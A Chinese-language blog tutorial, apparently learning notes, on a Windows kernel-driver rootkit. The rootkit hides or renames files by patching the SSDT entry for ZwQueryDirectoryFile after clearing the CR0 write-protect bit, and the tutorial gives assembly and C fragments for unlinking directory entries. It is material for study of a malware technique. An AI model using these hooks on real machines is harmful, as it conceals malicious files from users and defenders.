RootKit 初探——文件隐藏与混淆
===================

什么是Rootkit?
-----------

Rootkit一词最早出现在Unix系统上。系统入侵者为了获取系统管理员级的root权限，或者为了清除被系统记录的入侵痕迹，会重新汇编一些软件工具（术语称为kit），例如ps、netstat、w、passwd等等，这些软件即称作Rootkit。其后类似的入侵技术或概念在其他的操作系统上也被发展出来，主要是文件、进程、系统记录的隐藏技术，以及网络数据包、键盘输入的拦截窃听技术等，许多木马程序都使用了这些技术，因此木马程序也可视为Rootkit的一种。 在Windows平台下，RootKit的实现主要依靠于驱动。相比起普通的程序，驱动有着更大的权限和更底层的功能。通过Hook系统相关的函数，RootKit可以实现对文件目录、网络、进程甚至系统层面的操作。也正因为如此，RootKit在网络上参考资料较少，微软也隐藏了一些内核函数没有公开。RootKit上手很难，但是与病毒、木马结合起来，危害极大。

安装环境
----

由于不同的系统内核不同，因此相应的API、代码执行机制和Hook的方法也不尽相同。在本次探索中使用的是Windows 7 32位专业版。同时，由于涉及到驱动层面的编程和执行，经常会遇到蓝屏重启的情况，因此建议在虚拟机环境下来玩RootKit。

### 所需组件

*   WDK：Windows驱动开发套件
*   DbgView：内核级别的调试软件
*   VisualStudio2008
*   DDKWizard：辅助开发工具

### 安装步骤

*   下载适用于Win7的WDK、VisualStudio2008、DDKWizard并安装
*   设置环境变量和程序设置，参考地址[https://blog.csdn.net/B\_H\_L/article/details/44751409](https://blog.csdn.net/B_H_L/article/details/44751409)

原理分析
----

### 概述

本次RootKit实现的核心是Hook系统获取文件信息的函数`ZwQueryDirectoryFile`。在打开文件资源管理器、刷新桌面等获取文件信息的操作的时候，系统会通过调用`ZwQueryDirectoryFile`来获取当前文件夹下的文件信息。RootKit可以修改系统调用该函数的函数指针，指向我们自定义的返回文件信息的函数。嗯，核心思想就这么简单。以下是原本的桌面，系统开启了查看隐藏文件、关闭了隐藏系统文件的选项 ![](http://ozhtfx691.bkt.clouddn.com//rootkit/file/rootkit_file_normal_1.png)

### CR0寄存器

为了安全起见，Windows XP及其以后的系统将一些重要的内存页设置为只读属性，这样就算有权力访问该表也不能随意对其修改，例如SSDT、IDT等。`cr0`是系统内的控制寄存器之一。控制寄存器是一些特殊的寄存器，它们可以控制CPU的一些重要特性。在本次实践中，需要对SSDT进行修改，因此需要禁用内存页的写保护。cr0的第16位是WP位，只要将这一位置0就可以禁用写保护，置1则可将其恢复。在代码中以汇编的形式实现。 禁用保护的汇编代码

```assembly
cli ;                将处理器标志寄存器的中断标志位清0，不允许中断
mov eax, cr0;        将cr0的值移动到eax寄存器
and eax, not 10000h; 将eax第16位和0进行与操作
mov cr0, eax;        eax值传回给cr0
```


驱动加载后，需要重新使能写保护

```assembly
mov eax, cr0
or eax, 10000h
mov cr0, eax
sti;将处理器标志寄存器的中断标志置1，允许中断
```


注意，`sti`和`stl`都是特权指令，需要在ring0的权限下执行。

### 文件结构体分析

Windows首先通过`ZwQueryDirectoryFile`来获取当前文件夹下的信息，函数原型如下

```c
NTSTATUS NTAPI ZwQueryDirectoryFile(//返回有关给定文件句柄指定的目录中的文件的各种信息
    IN HANDLE FileHandle,//文件句柄，由NtCreateFile或NtOpenFile返回
    IN HANDLE Event OPTIONAL,//调用者创建的事件的可选句柄，可选参数
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,//与APC相关，可选参数，NUll
    IN PVOID ApcContext OPTIONAL,//与APC相关
    OUT PIO_STATUS_BLOCK IoStatusBlock,//指向IO_STATUS_BLOCK结构的指针，接收最终完成状态和有关操作的信息
    OUT PVOID FileInformation,//指向缓冲区的指针，该缓冲区接收有关文件的所需信息
    IN ULONG Length,//FileInformation指向的缓冲区大小（以字节为单位）
    IN FILE_INFORMATION_CLASS FileInformationClass,//包含文件信息的结构体
    IN BOOLEAN ReturnSingleEntry,//如果只返回一个条目，则设置为TRUE，否则为FALSE
    IN PUNICODE_STRING FileMask OPTIONAL,//指向调用者分配的Unicode字符串的可选指针，该字符串包含FileHandle指定的目录中的文件名（或多个文件，如果使用通配符）。 此参数是可选的，可以为NULL。
    IN BOOLEAN RestartScan );//如果要从目录中的第一个条目开始扫描，则设置为TRUE。 如果从先前恢复扫描，则设置为FALSE。
```


看起来很复杂对不对，但实际上我们要动手脚的只是其中的`FileInformationClass`字段，它存储了文件的信息。至于其他字段——有些好玩的，譬如返回传入句柄、IO设置等操作，以后有机会深挖。`FileInformationClass`有多种子类，包括`_FILE_DIRECTORY_INFORMATION`、`_FILE_FULL_DIR_INFORMATION`、`_FILE_ID_FULL_DIR_INFORMATION`、`_FILE_BOTH_DIR_INFORMATION`、`_FILE_ID_BOTH_DIR_INFORMATION`、`_FILE_NAMES_INFORMATION`这六种。看起来眼花缭乱，实际上大同小异，让我们从`_FILE_DIRECTORY_INFORMATION`的定义开始

```c
typedef struct _FILE_DIRECTORY_INFORMATION//查询目录中文件的详细信息
{
    ULONG       NextEntryOffset;//下一个文件目录信息入口点,到达末尾则为NULL
    ULONG       FileIndex;//父目录中文件的字节偏移量，可以随时更改以维护排序顺序。
    LARGE_INTEGER   CreationTime;//文件创建时间
    LARGE_INTEGER   LastAccessTime;//最后访问时间
    LARGE_INTEGER   LastWriteTime;
    LARGE_INTEGER   ChangeTime;
    LARGE_INTEGER   EndOfFile;//文件末尾的偏移量
    LARGE_INTEGER   AllocationSize;//文件分配大小
    ULONG       FileAttributes;//文件属性
    ULONG       FileNameLength;//文件名长度
    WCHAR       FileName[1];//指定文件名字符串的第一个字符
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;
```


右键文件，点击属性，再对比下上面结构体里的内容，是不是对上了？这个结构体包含了文件的属性信息。等等，还有另外五种不知道？这是`_FILE_FULL_DIR_INFORMATION`的声明

```c
typedef struct _FILE_FULL_DIR_INFORMATION {//查询目录中文件的详细信息
    ULONG       NextEntryOffset;//下一个文件目录信息入口点,到达末尾则为NULL
    ULONG       FileIndex;//父目录中文件的字节偏移量，可以随时更改以维护排序顺序。
    LARGE_INTEGER   CreationTime;//文件创建时间
    LARGE_INTEGER   LastAccessTime;//最后访问时间
    LARGE_INTEGER   LastWriteTime;
    LARGE_INTEGER   ChangeTime;
    LARGE_INTEGER   EndOfFile;//文件末尾的偏移量
    LARGE_INTEGER   AllocationSize;//文件分配大小
    ULONG       FileAttributes;//文件属性
    ULONG       FileNameLength;//文件名长度
    ULONG       EaSize;//文件的扩展属性（EA）的组合长度（以字节为单位）
    WCHAR       FileName[1];//指定文件名字符串的第一个字符
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;
```


与上面的`_FILE_DIRECTORY_INFORMATION`相比只是多了`EaSize`这个属性。其他的结构体也差不多，无非就是多多少少几个属性罢了。详情可以去MSDN上查看。 注意`NextEntryOffset`这个字段，它指向的是下一个文件信息结构体的地址。是不是类似链表？文件隐藏的关键就在于这个链表，将存储要隐藏文件信息的块从这个链表上剔除，系统在读取的时候就会跳过这个文件，于是就实现了隐藏的目的。**核心思想：敲掉链表上的元素** 知道了原理，接下来就看下关键代码吧。

关键实现
----

* RootKit实现文件隐藏的首要目标是替换系统内置的查询函数。首先我们要声明一个用于替换的函数`NewZwQueryDirectoryFile`，参数类型、个数和顺序与内置函数一样

  ```c
  NTSTATUS NTAPI NewZwQueryDirectoryFile(//返回有关给定文件句柄指定的目录中的文件的各种信息
      IN HANDLE FileHandle,//文件句柄，由NtCreateFile或NtOpenFile返回
      IN HANDLE Event OPTIONAL,//调用者创建的事件的可选句柄，可选参数
      IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,//与APC相关，可选参数，NUll
      IN PVOID ApcContext OPTIONAL,//与APC相关
      OUT PIO_STATUS_BLOCK IoStatusBlock,//指向IO_STATUS_BLOCK结构的指针，接收最终完成状态和有关操作的信息
      OUT PVOID FileInformation,//指向缓冲区的指针，该缓冲区接收有关文件的所需信息
      IN ULONG Length,//FileInformation指向的缓冲区大小（以字节为单位）
      IN FILE_INFORMATION_CLASS FileInformationClass,//包含文件信息的结构体
      IN BOOLEAN ReturnSingleEntry,//如果只返回一个条目，则设置为TRUE，否则为FALSE
      IN PUNICODE_STRING FileMask OPTIONAL,//指向调用者分配的Unicode字符串的可选指针，该字符串包含FileHandle指定的目录中的文件名（或多个文件，如果使用通配符）。 此参数是可选的，可以为NULL。
      IN BOOLEAN RestartScan );//如果要从目录中的第一个条目开始扫描，则设置为TRUE。 如果从先前恢复扫描，则设置为FALSE。
  ```

* 在驱动加载函数中修改系统函数表的地址，将内置函数的调用转化为对自定函数的调用

  ```c
  OldZwQueryDirectoryFile = (ZWQUERYDIRECTORYFILE) SYSTEMSERVICE( ZwQueryDirectoryFile ); /* 将旧函数地址值保存备份 */
  (ZWQUERYDIRECTORYFILE) SYSTEMSERVICE( ZwQueryDirectoryFile ) = NewZwQueryDirectoryFile; /* 将旧函数地址值改变为我们的函数地址入口值 */
  ```

* 执行自定义函数阶段，首先执行内置的查询函数获取信息，然后对信息进行处理，提取出关键的属性

  ```c
  PVOID   p       = FileInformation;//获取文件信息
  pLastOne = GetNextEntryOffset( p, FileInformationClass );//获取下一个文件偏移
  ```

  

* 对文件名进行比对，类似对链表的操作将结点剔除

  ```c
  if ( RtlCompareMemory( GetEntryFileName( p, FileInformationClass ), L"InstDrv.exe", 16 ) == 16 ) // RootkitFile改为自己想要隐藏的文件名和目录名 
  {
      KdPrint( ("[-]Hide...../n") );
      KdPrint( ("[-]现在在目录下看不到文件了/n") );
      if ( pLastOne == 0 )//如果没有下一个文件
      {
          if ( p == FileInformation )//如果当前目录只有唯一文件
              ntStatus = STATUS_NO_MORE_FILES;//设置为没有更多文件
          else
              SetNextEntryOffset( pLast, FileInformationClass, 0 );//将前一文件的指向下一文件的指针置空
          break;
      }
      else  {//当前文件后有文件
          int iPos    = ( (ULONG) p) - (ULONG) FileInformation;//获取相对偏移量
          int iLeft   = (DWORD) Length - iPos - pLastOne;
          RtlCopyMemory( p, (PVOID) ( (char *) p + pLastOne), (DWORD) iLeft );//目的地址，源地址，长度
          KdPrint( ("iPos:%ld/tLength:%ld/tiLeft:%ld/t,NextOffset:%ld/tpLastOne:%ld/tCurrent:0x%x/n",
                iPos, Length, iLeft, GetNextEntryOffset( p, FileInformationClass ), pLastOne, p) );
          continue;
      }
  }
  ```

  


![](http://ozhtfx691.bkt.clouddn.com//rootkit/file/rootkit_file_hidden.png) 于是桌面上少了什么大家来找茬

拓展
--

* 文件隐藏除了通过剔除结点来实现，还可以通过系统内置的API实现

  ```c
  ntStatus = STATUS_NO_MORE_FILES;
  ```


  将`ntStatus`设置为`STATUS_NO_MORE_FILES`后，文件夹内只显示系统内置的文件（如我的电脑图标等），用户个人的文件将全部隐藏 ![](http://ozhtfx691.bkt.clouddn.com//rootkit/file/rootkit_allfile_hidden.png)

* 文件隐藏的另一种方式是混淆，将文件名或文件信息修改为无意义的字串令其失去标识的功能。虽然`FileInformationClass`内的属性都为`const`类型，但是可以通过内存拷贝（如`memcpy`)的方式修改内存内的值

  ```c
  pFileInfo = p;
  pwszUnicode = pFileInfo->FileName;
  RtlCopyMemory(pwszUnicode,L"666",4);
  q1 = &(pFileInfo->FileNameLength);
  *q1 = 3;
  ```


  ![](http://ozhtfx691.bkt.clouddn.com//rootkit/file/rootkit_file_mix.png)


待解决的问题
------

*   驱动加载过程中的实现，包括`ServiceDescriptorEntry`服务表的功能与调用、汇编去除页面保护的代码原理，以及函数返回的`ntStatus`具体信息等涉及Windows底层的知识，待深入学习后补充
*   本代码在Vbox下可以运行，但是在VMmare环境下会导致蓝屏，原因不明

源码
--

[file_operation.c](https://github.com/Pryriat/Rootkit_Lerning/blob/master/file_operation.c)